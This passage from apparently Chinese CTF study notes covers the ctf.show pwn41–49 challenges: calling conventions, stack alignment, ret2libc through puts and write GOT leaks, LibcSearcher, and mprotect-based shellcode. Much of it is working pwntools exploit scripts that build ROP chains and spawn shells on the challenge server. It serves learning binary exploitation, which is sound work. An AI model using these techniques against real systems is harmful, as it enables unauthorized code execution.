Passing）</strong>：x64架构的计算机使用寄存器来传递一部分参数。通常情况下，前几个参数会被传递到特定的寄存器中，而不是存放在栈上。例如，对于Windows操作系统上的x64架构，前四个整数或指针参数（整数、指针、地址等）会被依次存放在寄存器<code>RCX</code>、<code>RDX</code>、<code>R8</code>和<code>R9</code>中。（还有一种说法：RDI, RSI, RDX, RCX, R8, R9）</li><li><strong>栈传参（Stack Parameter Passing）</strong>：如果函数参数的数量超过了寄存器的限制，额外的参数将存储在栈上。参数从右向左依次入栈，即后面的参数先入栈，前面的参数后入栈。在栈上传参时，可能会有对齐要求，保证栈上数据的对齐方式。</li><li><strong>返回值传递（Return Value Passing）</strong>：函数的返回值通常通过寄存器<code>RAX</code>来传递。整数和指针类型的返回值通常存储在<code>RAX</code>中，而浮点数返回值通常存储在<code>XMM0</code>寄存器中。</li></ol><p><strong>工具</strong>：ROPgadget –binary .&#x2F;file_name  –only “pop|ret” | grep reg</p><ul><li><p>关于如何区分32位和64位的参数payload的编写顺序：想两者函数调用的编写规则，然后给倒过来写即可：</p><blockquote><p>32：压入参数   压入返回地址   压入函数地址</p><p>64：寄存器传参数   压入返回地址   压入函数地址</p></blockquote></li></ul><p>栈平衡：在编程中，函数调用的栈平衡指的是在程序执行过程中，确保函数调用和返回的堆栈（通常称为调用栈或执行栈）的平衡</p><blockquote><p>栈平衡就是给加一个ret的地址作为跳板让其返回到下一个栈地址继续执行，作为一个填充长度，放在rop调用链之前或者调用函数之前，不能放到调用函数之后</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system) </span><br><span class="line"><span class="comment"># 错误写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi + p64(ret)) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(ret)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line">binsh = <span class="number">0x400808</span></span><br><span class="line">system = <span class="number">0x400520</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span></span><br><span class="line">system = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>)   + p64(ret)+ p64(pop_rdi) + p64(binsh)+p64(system) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn41-42-bin-sh使用sh代替"><a href="#pwn41-42-bin-sh使用sh代替" class="headerlink" title="pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)"></a>pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</h2><ol><li>system(“&#x2F;bin&#x2F;sh”) ：<br>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。这种方式可以确保使用系统默认的shell程序执行命令，因为&#x2F;bin&#x2F;sh 链接通常指向<br>默认shell的可执行文件。</li><li>system(“sh”) ：<br>使用system(“sh”) 会直接启动一个名为sh 的shell程序，并在新的子进程中执行。这种方式假设系统的环境变量$PATH 已经配置了能够找到sh 可执行文件的路径，否则可能会导致找不到sh 而执行失败。</li></ol><h2 id="pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）"><a href="#pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）" class="headerlink" title="pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）"></a>pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</h2><p>知识点</p><ul><li>注意bss段的buf可以手动构造bin&#x2F;sh字符串作为参数传入。</li></ul><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230728173933897.png"  class="" lazyload></a><ul><li>gets函数没有输入的长度限制，可以一直输入直至回车键</li><li>如果read这种有输入长度限制但是不够rop链的，可以进行栈迁移</li></ul><p>注意，这里的一个问题困扰了很久：一个简单的ROP链是可以用GDB进行调试的，那复杂的怎么办呢？</p><p>这里和同学进行了请教，然后对wp的看似简单的rop链进行分析，这里需要注意个几个点：</p><ol><li>每一个函数调用在32位里面都需要跟一个返回地址，这里gets的返回地址是pop_ebx，system的返回地址是aaaa，main函数的返回地址是gets，因为如果你后面rop链要继续调用的话，函数调用为了完整性返回地址、参数必须完整</li><li>这段rop链子的调用过程概述：通过返回地址到gets读取参数buf2的参数（通过sendline传送的&#x2F;bin&#x2F;sh）然后通过pop将buf2存入ebx，然后system调用参数buf2中的bin&#x2F;sh从而夺权</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure><ol start="3"><li><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28169)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x804B060</span></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx = <span class="number">0x8048409</span> <span class="comment"># 0x08048409 : pop ebx ; ret</span></span><br><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x602080</span></span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"><span class="comment"># ret栈对齐是0x10 加单数个理论上</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)  + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li><li><p>gdb的调试过程：通过查看内存变量观察函数的调用过程    通过观察主函数的返回地址观察函数调用过程</p><ol><li><p>先通过finish运行到主函数内部进行查看</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224725259.png"  class="" lazyload></a></li><li><p>然后发现主函数返回到gets函数</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224947918.png"  class="" lazyload></a></li><li><p>查看gets的系统调用执行</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225224295.png"  class="" lazyload></a></li><li><p>通过finish查看gets的返回地址是pop ebx 然后ret到system执行，在这里只是pop  ebx只是作为一个跳板，只是为了返回到system地址进行getshell而已</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225354257.png"  class="" lazyload></a></li><li><p>发现一致</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225807535.png"  class="" lazyload></a></li><li><p>这里还有一个简单的思路：通过覆盖gets的返回地址为system，然后让system的返回地址为buf2同时作为gets的参数也可以getshell，这个原理就是每个函数调用的参数返回地址等，与其他函数的调用无关。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(system) + p32(buf2)+ p32(buf2)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="pwn45-46-got表泄露-ret2libc"><a href="#pwn45-46-got表泄露-ret2libc" class="headerlink" title="pwn45&#x2F;46(got表泄露) ret2libc"></a>pwn45&#x2F;46(got表泄露) ret2libc</h2><blockquote><p> 特征：没有system  没有bin&#x2F;sh</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。这里注意要对泄露的函数原型进行查看，对payload要完成传参。</p><p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p></blockquote><h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731145442576.png"  class="" lazyload></a></p><p>查询libc偏移和版本的网站：<a href="https://libc.blukat.me/">libc database search (blukat.me)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x08048356</span></span><br><span class="line">lg(<span class="string">&#x27;puts plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;write plt&#x27;</span>, write_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过打印获得puts的地址</span></span><br><span class="line"><span class="comment"># read 0xC8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>)  </span><br><span class="line"><span class="comment"># 这里的返回地址写成main函数可以让这个payload执行完毕之后，再一次进行溢出</span></span><br><span class="line">payload += p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 因为小端序 倒取四个字节</span></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过puts的地址获取libc的地址</span></span><br><span class="line"><span class="comment"># puts_addr = 0xf7d6b360</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x067360</span></span><br><span class="line">system_plt = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh =  libc_base + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>) </span><br><span class="line">payload += p32(system_plt) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里的接收的&#x2F;x7f，因为libc的地址是六位，前两位是00不显示。又因为接收的的字节，所以用u64解包，并且高位用00补全八位</p><blockquote><p>0x 7f ff f7 e1 50 00<br>puts_addr &#x3D; p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’）</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173353357.png"  class="" lazyload></a><p>puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173459832.png"  class="" lazyload></a></blockquote><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731172534065.png"  class="" lazyload></a><h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801164558925.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>这里有一个注意的点，p64(pop_rsi_r15)这个点，对于write这个函数的参数只有三个参数：</p><ul><li>fd：文件描述符，这里就是1</li><li>buf：需要传入的字符串</li><li>count：每次写入的字节数</li></ul><p>但是看看gadget，只能控制rdi和rsi，r15不能控制，这种情况一般是没有用的padding给填充位置，或者没办法控制。</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801211525162.png"  class="" lazyload></a><h2 id="pwn47-48（ret2libc-LibcSeacher）"><a href="#pwn47-48（ret2libc-LibcSeacher）" class="headerlink" title="pwn47&#x2F;48（ret2libc - LibcSeacher）"></a>pwn47&#x2F;48（ret2libc - LibcSeacher）</h2><h3 id="四个libc目录区别"><a href="#四个libc目录区别" class="headerlink" title="四个libc目录区别"></a>四个libc目录区别</h3><blockquote><p>在Linux系统中，这四个目录(lib, lib32, lib64, libx32)是用来存放共享库文件的目录，它们之间有一些区别，具体如下：</p><ol><li>lib目录：这是存放32位架构的共享库的目录。在早期的32位系统中使用，现在仍然保留为了向后兼容性。通常位于<code>/usr/lib</code>或者<code>/lib</code>目录下。</li><li>lib32目录：这是存放32位架构的共享库的目录，但它主要用于64位系统的多架构支持。例如，64位的Linux系统可能需要兼容32位应用程序，这时候就会使用lib32目录来存放这些32位的共享库。通常位于<code>/usr/lib32</code>或者<code>/lib32</code>目录下。</li><li>lib64目录：这是存放64位架构的共享库的目录。在64位系统中，这是主要的共享库目录，用于存放64位的共享库文件。通常位于<code>/usr/lib64</code>或者<code>/lib64</code>目录下。</li><li>libx32目录：这是特定于x32 ABI（Application Binary Interface）的共享库目录。x32 ABI是一种特殊的ABI，它允许在64位系统上运行32位应用程序，但是使用更大的寄存器集，从而提高性能。libx32目录用于存放这种特定格式的共享库。通常位于<code>/usr/libx32</code>或者<code>/libx32</code>目录下。</li></ol><p>总结一下，这四个目录是为了在不同的架构和ABI条件下存放共享库文件，确保系统能够正确加载和运行应用程序。通常情况下，64位系统会使用lib64目录作为主要的共享库目录，同时lib32和libx32目录用于兼容32位和特定x32 ABI的应用程序。不过，请注意这些目录的具体位置可能会因Linux发行版和系统配置而有所不同。</p></blockquote><p><strong>注意点</strong>：这里的libc用网站查阅脚本本地可以打通，远程不行，于是用了libcSeacher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28187</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p,s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">puts   = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(puts) + p32(main) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span> + <span class="number">4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">dbg()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：对于这个脚本，一般用LibcSeacher的时候可能会返回多个Libc版本，为了保证代码的健壮性，可以用<code>ldd --version</code>在本地调试的时候直接查看本地的libc版本这样的话，本地调试回快很多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">1 - libc6_2.11.1-0ubuntu7.14_i386</span><br><span class="line">2 - libc6_2.11.1-0ubuntu7.15_i386</span><br><span class="line">3 - libc6_2.31-2_i386</span><br><span class="line">[+] Choose one : 2</span><br></pre></td></tr></table></figure><h2 id="pwn49-静态编译：修改内存权限mprotect"><a href="#pwn49-静态编译：修改内存权限mprotect" class="headerlink" title="pwn49(静态编译：修改内存权限mprotect)"></a>pwn49(静态编译：修改内存权限mprotect)</h2><p>对于静态编译的程序，可以用file或者ldd命令查看。</p><p><strong>静态编译特征</strong>：所有程序依赖的库函数和代码都被编译成最终的可执行文件。这意味着可执行文件包含了所有需要的代码，不需要依赖外部的动态链接库。所以文件可能会比较大，用IDA查看的话反编译的函数也很多，但是运行效率肯定会很高。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ./pwn</span><br><span class="line">$ <span class="keyword">not</span> a dynamic executable</span><br><span class="line">$ file pwn</span><br><span class="line">$ ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>用vmmap查看内存布局的时候，可以看到stack是不可执行状态，所以我们要使用mprotect函数修改可执行权限</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x8048000  <span class="number">0</span>x80d7000  r-xp    <span class="number">8</span>f000      <span class="number">0</span> /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80d8000  <span class="number">0</span>x80dc000  rw-p     <span class="number">4000</span>  <span class="number">8</span>f000 /mnt/d/Yixin/Download/pwn</span><br><span class="line"><span class="number">0</span>x80dc000  <span class="number">0</span>x80ff000  rw-p    <span class="number">23000</span>      <span class="number">0</span> [heap]</span><br><span class="line"><span class="number">0</span>xf7ff8000 <span class="number">0</span>xf7ffc000 r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line"><span class="number">0</span>xf7ffc000 <span class="number">0</span>xf7ffe000 r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000 rw-p    <span class="number">21000</span>      <span class="number">0</span> [stack]</span><br></pre></td></tr></table></figure><h3 id="mprotect函数原型"><a href="#mprotect函数原型" class="headerlink" title="mprotect函数原型"></a>mprotect函数原型</h3><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230803175812533.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230803175812533.png"  class="" lazyload></a><p>这里的注意点就两个：</p><ol><li>开始碧血是内存的起始地址，长度是页大小的整数倍</li><li>没必要将整个栈空间执行权限都进行修改，随便选择一个空间地址进行修改权限</li></ol><p>这里可以选择的段很多，举个例子bss段和got.plt段</p><blockquote><p><strong>注意点</strong>：可以用Ctfl + S 调出IDA Pro  所有段的跳转概览图</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.got.plt 080DA000080DA044RW</span><br><span class="line">.bss     080DB320080DBFFCRW</span><br></pre></td></tr></table></figure><p>这里我们选择.got.plt的地址0x80DA000，找可写的段</p><p><strong>原因</strong>：这里不选择bss段的开头0x80DB320，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p><h3 id="read函数原型"><a href="#read函数原型" class="headerlink" title="read函数原型"></a>read函数原型</h3><blockquote><p>ssize_t read(int fd, void * buf, size_t count)<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">M_addr  = <span class="number">0x80DA000</span></span><br><span class="line">M_size  =  <span class="number">0x1000</span></span><br><span class="line">M_proc  = <span class="number">7</span></span><br><span class="line">pop_ebx_esi_edi = <span class="number">0x08049bd9</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect return read</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + 